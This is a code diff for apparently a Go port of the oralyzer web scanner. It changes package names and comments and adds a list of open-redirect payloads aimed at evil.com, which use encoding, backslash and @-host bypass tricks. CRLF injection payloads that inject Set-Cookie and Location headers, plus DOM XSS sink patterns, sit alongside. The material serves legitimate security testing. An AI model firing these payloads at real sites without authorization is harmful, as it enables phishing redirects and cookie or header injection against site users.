@@ -1,6 +1,6 @@
-package main
+package oralyzer
 
-// UserAgents for rotation (from Python's core/others.py)
+// UserAgents contains User-Agent strings for rotation.
 var UserAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
 	"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-810 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
@@ -13,7 +13,7 @@ var UserAgents = []string{
 	"Mozilla/5.0 (PlayStation 4 5.01) AppleWebKit/601.2 (KHTML, like Gecko)",
 }
 
-// DOMSourcesSinks for XSS detection (126 patterns from oralyzer.py lines 87-213)
+// DOMSourcesSinks contains patterns for DOM XSS source/sink detection.
 var DOMSourcesSinks = []string{
 	"location.href",
 	"location.hash",
@@ -142,7 +142,7 @@ var DOMSourcesSinks = []string{
 	"document.evaluate",
 }
 
-// WaybackDorks for filtering URLs (from wayback.py lines 6-28)
+// WaybackDorks contains URL patterns for filtering Wayback Machine results.
 var WaybackDorks = []string{
 	`.*\?next=.*`,
 	`.*\?url=.*`,
@@ -167,7 +167,7 @@ var WaybackDorks = []string{
 	`.*\?nextURL=.*`,
 }
 
-// CRLFPayloads for CRLF injection testing (25 payloads from crlf.py lines 4-30)
+// CRLFPayloads contains payloads for CRLF injection testing.
 var CRLFPayloads = []string{
 	`%0d%0aLocation:www.google.com%0d%0a`,
 	`%0d%0aSet-Cookie:name=ch33ms;`,
@@ -196,10 +196,64 @@ var CRLFPayloads = []string{
 	"\r\tSet-Cookie:name=ch33ms;",
 }
 
-// GoogleVariants for CRLF detection (checking if Location header redirects to Google)
+// GoogleVariants contains Google URL variants for CRLF detection.
 var GoogleVariants = []string{
 	"https://www.google.com",
 	"http://www.google.com",
 	"google.com",
 	"www.google.com",
+}
+
+// DefaultPayloads contains the default open redirect payloads.
+var DefaultPayloads = []string{
+	"//evil.com",
+	"//evil.com/",
+	"///evil.com",
+	"////evil.com",
+	"/\\/evil.com",
+	"https://evil.com",
+	"https:evil.com",
+	"http://evil.com",
+	"http:evil.com",
+	"//evil.com/%2f..",
+	"///evil.com/%2f..",
+	"////evil.com/%2f..",
+	"https://evil.com/%2f..",
+	"/https://evil.com",
+	"//evil%E3%80%82com",
+	"////evil.com/",
+	"https://evil.com//",
+	"//%0d%0aevil.com",
+	"//evil%00.com",
+	"https:/evil.com",
+	"https:\\evil.com",
+	"/\\evil.com",
+	"\\evil.com",
+	"evil.com",
+	".evil.com",
+	"。evil.com",
+	"%E3%80%82evil.com",
+	"@evil.com",
+	"?evil.com",
+	"#evil.com",
+	"//evil.com\\@good.com",
+	"https://evil.com\\@good.com",
+	"//evil.com#@good.com",
+	"https://evil.com#@good.com",
+	"//evil.com?@good.com",
+	"https://evil.com?@good.com",
+	"/\t/evil.com",
+	"/ /evil.com",
+	"/%09/evil.com",
+	"/%20/evil.com",
+	"///\\;@evil.com",
+	"////\\;@evil.com",
+	"https:///\\;@evil.com",
+	"//evil.com:80",
+	"//evil.com:443",
+	"//evil.com:80/",
+	"//evil.com:443/",
+	"/%0D/evil.com",
+	"/%0A/evil.com",
+	"/%0D%0A/evil.com",
 }
